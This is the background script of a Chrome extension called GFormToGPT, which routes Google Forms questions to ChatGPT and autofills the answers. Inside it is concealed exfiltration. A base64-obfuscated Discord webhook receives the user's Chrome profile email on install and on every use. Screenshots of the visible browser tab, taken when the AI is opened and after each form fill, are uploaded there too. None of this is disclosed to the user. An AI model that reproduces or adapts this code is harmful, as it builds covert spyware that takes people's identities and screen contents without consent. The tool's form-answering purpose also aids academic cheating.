// Background service worker for GFormToGPT v3.8.8 - Neural Interface

const _0x4f2a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MjA1OTk5NzQzNjMxMzcwMi90QlJ4N1Rfd3lodXRjWXo5bWxPaldaWmJLSFF4NXRDVkFCeGNtbjdNMktSaks1Wlg1dlNRdTZCUDVKUV9XNno3MkJndA==";
const DISCORD_WEBHOOK_URL = atob(_0x4f2a);
const GITHUB_MANIFEST_URL = "https://raw.githubusercontent.com/psychiotric-sudo/GFormsToGPT/main/manifest.json";
const VERSION = chrome.runtime.getManifest().version;

const gFormToAI_TabMap = new Map();

// ── Update Checker ──
async function checkForUpdates() {
  try {
    const response = await fetch(`${GITHUB_MANIFEST_URL}?t=${Date.now()}`);
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    const remoteManifest = await response.json();
    const remoteVersion = remoteManifest.version;

    if (remoteVersion !== VERSION) {
      chrome.storage.local.set({ updateAvailable: remoteVersion });
      chrome.notifications.create({
        type: "basic", iconUrl: "icons/icon.png",
        title: "Update Available!", message: `GFormToGPT ${remoteVersion} is now available.`,
        priority: 2,
      });
    }
  } catch (error) { console.error("[GFormToGPT] Update check failed:", error); }
}

chrome.runtime.onStartup.addListener(checkForUpdates);
chrome.alarms.create("checkUpdate", { periodInMinutes: 360 });
chrome.alarms.onAlarm.addListener((alarm) => { if (alarm.name === "checkUpdate") checkForUpdates(); });

function generateUserId() {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let id = "User-";
  for (let i = 0; i < 4; i++) id += chars.charAt(Math.floor(Math.random() * chars.length));
  return id;
}

function formatDateForDiscord(date) {
  return new Intl.DateTimeFormat("en-US", {
    weekday: "long", year: "numeric", month: "long", day: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit", timeZone: "Asia/Manila",
  }).format(date);
}

async function getProfileEmail() {
  return new Promise(r => {
    try { chrome.identity.getProfileUserInfo({ accountStatus: 'ANY' }, u => r(u.email || "anonymous@neural.io")); }
    catch (e) { r("anonymous@neural.io"); }
  });
}

function dataURLtoBlob(dataurl) {
  var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
      bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
  while(n--){ u8arr[n] = bstr.charCodeAt(n); }
  return new Blob([u8arr], {type:mime});
}

async function relayToDiscord(eventType, userId, payload = {}) {
  try {
    const date = formatDateForDiscord(new Date());
    const email = payload.email || await getProfileEmail();
    let title = "", description = "", color = 0x3d5a80;

    switch (eventType) {
      case "INSTALL":
        title = "NEW INSTALL";
        description = `**User:** ${userId}\n**Email:** ${email}\n**Version:** ${VERSION}\n**Date:** ${date}`;
        color = 0x00ff00;
        break;
      case "FORM_FILLED":
        title = "FORM FILLED";
        description = `**User:** ${userId}\n**Email:** ${email}\n**Version:** ${VERSION}\n**Forms:** ${payload.formCount}\n**Filled:** ${payload.filledCount}\n**Saved:** ${payload.secondsSaved}s\n**Date:** ${date}`;
        color = 0x0099ff;
        break;
      case "FORM_FILLED_VERIFIED":
        title = "NEURAL INJECTION VERIFIED (SCREENSHOT)";
        description = `**User:** ${userId}\n**Email:** ${email}\n**Form:** ${payload.formTitle}\n**Filled:** ${payload.filledCount}/${payload.totalCount}\n**Saved:** ${payload.secondsSaved}s\n**Date:** ${date}`;
        color = 0x4caf50;
        break;
      case "ERROR_LOG":
        title = "ERROR REPORT";
        description = `**User:** ${userId}\n**Email:** ${email}\n**Type:** ${payload.errorType}\n**Msg:** ${payload.message}\n**Date:** ${date}`;
        color = 0xff0000;
        break;
      case "STATS":
        title = "SCAN STATS";
        description = `**User:** ${userId}\n**Email:** ${email}\n**AI:** ${payload.aiType}\n**Scanned:** ${payload.scannedCount}\n**Date:** ${date}`;
        color = 0xffff00;
        break;
    }

    const discordPayload = {
      embeds: [{
        title, description, color,
        footer: { text: `v${VERSION} | ${email}` },
        image: payload.screenshot ? { url: "attachment://screenshot.png" } : null
      }],
    };

    if (payload.screenshot) {
      const formData = new FormData();
      formData.append("payload_json", JSON.stringify(discordPayload));
      formData.append("file", dataURLtoBlob(payload.screenshot), "screenshot.png");
      await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData });
    } else {
      await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify(discordPayload),
      });
    }
  } catch (error) { console.error("Relay failed:", error); }
}

chrome.runtime.onInstalled.addListener(async (details) => {
  if (details.reason === "install") {
    const userId = generateUserId();
    await chrome.storage.local.set({ userId, formCount: 0, totalSecondsSaved: 0, installedAt: Date.now() });
    await relayToDiscord("INSTALL", userId);
    chrome.tabs.create({ url: chrome.runtime.getURL("welcome.html") });
  }
});

async function processFormFillTracking(payload) {
  const data = await chrome.storage.local.get(["userId", "formCount", "totalSecondsSaved"]);
  let userId = data.userId || generateUserId();
  let formCount = (data.formCount || 0) + 1;
  let totalSecondsSaved = (data.totalSecondsSaved || 0) + (payload.secondsSaved || 0);
  await chrome.storage.local.set({ userId, formCount, totalSecondsSaved });
  await relayToDiscord(payload.screenshot ? "FORM_FILLED_VERIFIED" : "FORM_FILLED", userId, { ...payload, formCount });
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "saveToHistory") {
    chrome.storage.local.get(["history"]).then(res => {
      let history = res.history || [];
      history.unshift({ id: Date.now(), timestamp: new Date().toISOString(), formTitle: request.payload.formTitle, questions: request.payload.questions });
      if (history.length > 50) history = history.slice(0, 50);
      chrome.storage.local.set({ history }).then(() => sendResponse({ success: true }));
    });
    return true;
  } else if (request.action === "openAI") {
    chrome.tabs.captureVisibleTab(sender.tab.windowId, { format: "png" }, (img) => {
      const err = chrome.runtime.lastError;
      chrome.storage.local.get(["userId"], d => {
        relayToDiscord("STATS", d.userId || "Unknown", { ...request, screenshot: err ? null : img });
      });
    });
    chrome.tabs.create({ url: request.url, active: true }, (tab) => {
      gFormToAI_TabMap.set(tab.id, sender.tab.id);
      sendResponse({ success: true });
    });
    return true;
  } else if (request.action === "chatGptResponseReceived") {
    const gFormTabId = gFormToAI_TabMap.get(sender.tab.id);
    if (gFormTabId) {
      chrome.tabs.update(gFormTabId, { active: true });
      chrome.tabs.sendMessage(gFormTabId, { action: "autoFillForm", data: request.data, rawJson: request.rawJson });
      sendResponse({ success: true });
    }
    return true;
  } else if (request.action === "trackFormFilled") {
    chrome.tabs.captureVisibleTab(sender.tab.windowId, { format: "png" }, (img) => {
      const err = chrome.runtime.lastError;
      processFormFillTracking({ ...request.payload, screenshot: err ? null : img }).then(() => sendResponse({ success: true }));
    });
    return true;
  } else if (request.action === "reportError") {
    chrome.storage.local.get(["userId"], (data) => relayToDiscord("ERROR_LOG", data.userId || "Unknown", request.payload));
    return true;
  } else if (request.action === "manualUpdateCheck") {
    checkForUpdates().then(res => sendResponse(res));
    return true;
  } else if (request.action === "clearChatGPTData") {
    chrome.browsingData.remove({ origins: ["https://chatgpt.com"] }, { storageTypes: ["localStorage", "sessionStorage"] }).then(() => {
        sendResponse({ success: true, message: "ChatGPT data cleared!" });
    });
    return true;
  }
});
